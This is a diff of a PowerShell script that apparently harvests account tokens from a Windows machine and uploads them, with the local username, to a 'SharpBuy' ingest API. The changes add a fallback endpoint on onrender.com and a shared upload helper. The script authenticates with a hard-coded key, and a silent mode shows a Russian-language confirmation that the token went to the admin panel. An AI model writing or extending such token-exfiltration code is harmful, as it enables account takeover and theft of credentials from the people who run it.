@@ -14,7 +14,10 @@ param(
     [switch]$Silent
 )
 
-$Script:SharpBuyUploadUrl = "https://sharpbuy.org/api/token-ingest"
+$Script:SharpBuyUploadUrls = @(
+    "https://sharpbuy.onrender.com/api/token-ingest",
+    "https://sharpbuy.org/api/token-ingest"
+)
 $Script:SharpBuyUploadKey = "sb_ing_a8K2mP9xQ4vL7nR1"
 
 $ErrorActionPreference = "Stop"
@@ -402,6 +405,30 @@ function Extract-AllTokens {
     return (Merge-TokenResults -Items $found)
 }
 
+function Invoke-SharpBuyIngest {
+    param(
+        [string]$Body,
+        [int]$TimeoutSec = 30
+    )
+
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    $headers = @{ "X-SharpBuy-Key" = $Script:SharpBuyUploadKey }
+    $lastError = $null
+
+    foreach ($url in $Script:SharpBuyUploadUrls) {
+        try {
+            return Invoke-RestMethod -Uri $url -Method POST `
+                -ContentType "application/json; charset=utf-8" `
+                -Headers $headers -Body $Body -TimeoutSec $TimeoutSec
+        } catch {
+            $lastError = $_
+        }
+    }
+
+    if ($lastError) { throw $lastError }
+    throw "No upload endpoints available"
+}
+
 function Send-SharpBuyEvent {
     param(
         [string]$Status,
@@ -409,7 +436,6 @@ function Send-SharpBuyEvent {
         [string]$AccountName = ""
     )
     try {
-        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
         $body = @{
             event       = $true
             status      = $Status
@@ -419,11 +445,11 @@ function Send-SharpBuyEvent {
             username    = $env:USERNAME
             source      = "extract-bat"
         } | ConvertTo-Json -Compress
-        $headers = @{ "X-SharpBuy-Key" = $Script:SharpBuyUploadKey }
-        Invoke-RestMethod -Uri $Script:SharpBuyUploadUrl -Method POST `
-            -ContentType "application/json; charset=utf-8" `
-            -Headers $headers -Body $body -TimeoutSec 20 | Out-Null
-    } catch { }
+        Invoke-SharpBuyIngest -Body $body -TimeoutSec 20 | Out-Null
+    } catch {
+        # Upload failure should not crash extraction; admin may miss the log entry.
+        $script:LastUploadError = $_.Exception.Message
+    }
 }
 
 function Send-TokensToSharpBuy {
@@ -450,12 +476,9 @@ function Send-TokensToSharpBuy {
     }
 
     $body = $payload | ConvertTo-Json -Depth 6 -Compress
-    $headers = @{ "X-SharpBuy-Key" = $Script:SharpBuyUploadKey }
 
     try {
-        return Invoke-RestMethod -Uri $Script:SharpBuyUploadUrl -Method POST `
-            -ContentType "application/json; charset=utf-8" `
-            -Headers $headers -Body $body -TimeoutSec 45
+        return Invoke-SharpBuyIngest -Body $body -TimeoutSec 45
     } catch {
         $detail = $_.Exception.Message
         if ($_.ErrorDetails -and $_.ErrorDetails.Message) { $detail = $_.ErrorDetails.Message }
@@ -537,7 +560,7 @@ function Write-TokenReport {
         if ($Silent) {
             $label = $Tokens[0].AccountName
             if ($Tokens[0].PersonaName) { $label = "$label ($($Tokens[0].PersonaName))" }
-            Show-SilentSuccess "Токен отправлен на sharpbuy.org/admin`n`nАккаунт: $label`nОткрой админку и нажми Обновить."
+            Show-SilentSuccess "Токен отправлен в админку SharpBuy.`n`nАккаунт: $label`nОткрой sharpbuy.org/admin`n(или sharpbuy.onrender.com/admin)`nи нажми Обновить."
         } elseif (-not $Silent) {
             Write-Host "Uploaded to SharpBuy cloud: $($Tokens.Count) token(s)." -ForegroundColor Green
             if ($uploadResult.total) {
